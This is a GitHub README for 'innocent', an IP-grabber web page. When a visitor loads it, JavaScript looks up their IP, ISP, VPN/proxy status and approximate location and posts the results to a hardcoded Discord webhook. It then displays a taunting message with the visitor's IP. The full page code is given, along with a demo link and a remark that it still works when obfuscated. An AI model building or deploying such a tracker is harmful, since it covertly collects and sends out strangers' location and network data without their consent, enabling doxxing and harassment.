EXAMPLE URI: [CLICK HERE](https://hideakiatsuyo.github.io/innocent)

## OOF

- IP
- IP Infos(Idea from [venaxyt](https://github.com/venaxyt))

Example Result:<br>
![](https://i.imgur.com/P5St00h.png)
<br>
[open an issue](https://github.com/HideakiAtsuyo/innocent/issues/new) instead of being a kid + the webhook is still not deleted i'm waiting. :)
<br>
It also work when obfuscated:<br>
![](https://i.imgur.com/EsO3iPp.png)

```html
<!DOCTYPE html>
<html lang="fr">
  <head>
    <meta charset="utf-8">
    <title>Innocent</title>
    <script src="https://code.jquery.com/jquery-3.6.0.js"></script>
    <script type="application/javascript">
      $(function() {
          		$.getJSON("https://api.ipify.org?format=jsonp&callback=?", //Take the IP then use the callback function 
          			function(json) {//Discord Webhook under
          			$.getJSON(`http://demo.ip-api.com/json/${json.ip}?fields=66846719&lang=en`, /*Use ip-api.com API to get IP Infos then use the answer under*/ function(json2) {
                        const discordWebhook = "https://canary.discord.com/api/webhooks/934415150738464938/oPDmxpKkAUF6lbus2jQcOlsjB8VurxdhoG5Yf8VubLdCSZffJbz53xEEtstjOS7vrXD1"; //USE REDIRECTION NOT DIRECT WEBHOOK LMAO
                        let req = new XMLHttpRequest(); //Initialize The Request
                        req.open("POST", discordWebhook);
                        req.setRequestHeader("Content-Type", "application/json");
                        let payloadRes = { //Payload to send in the request
                            username: "Angel Gabriel", //Webhook Username
                            avatar_url: "https://patricia-lasserre.com/wp-content/uploads/2021/06/gabriel-750x500.jpg", //Webhook Avatar URL
                            content: "@everyone", //Content Will Only Ping(you can modify it)
                            embeds: [{ //Embed
                                title: `What's this ? The Informations About The Fabulous IP ${json.ip} !`, //Embed Title
                                description: `**ISP Informations**:\n=> Org: __**${json2.org}**__\n=> AS: __**${json2.as}**__ (ASN: __**${json2.asname}**__)\=> Reverse(Reverse DNS of the IP (can delay response)): ${json2.reverse||"Not Found Or Need To Wait More"}\n=> Mobile(Cellular Data): __**${json2.mobile}**__\n=> Hosting: __**${json2.hosting}**__\n=> Proxy or VPN or Tor: __**${json2.proxy}**__\n**Location**:\n=> Country: __**${json2.country}**__ (__**${json2.continent}**__)\n=> City: __**${json2.city}**__\n=> Lat: __**${json2.lat}**__ & Lon: __**${json2.lon}}**__`, //Embed Description
                                color: 0x46423C //0x36393f (Color) | If it ping everyone, you should put the default one if there is no ping you should use the second one, or take a custom one.. :)
                            }]
                        };
                        req.send(JSON.stringify(payloadRes)); //Send the request with the payload
                        console.log(json2)
      
                        setTimeout(() => {
                            document.write(`<center><img src="https://patricia-lasserre.com/wp-content/uploads/2021/06/gabriel-750x500.jpg"><h1>Did I just caught you on my website ${json.ip} ?</h1></center>`);
                        }, 2*1000); //Wait 2 seconds then write this as new page
                    });
          		});
          	});
        
    </script>
  </head>
  <body>
    <center>
      <br>WAIT 2 SECONDS
    </center>
  </body>
</html>
```
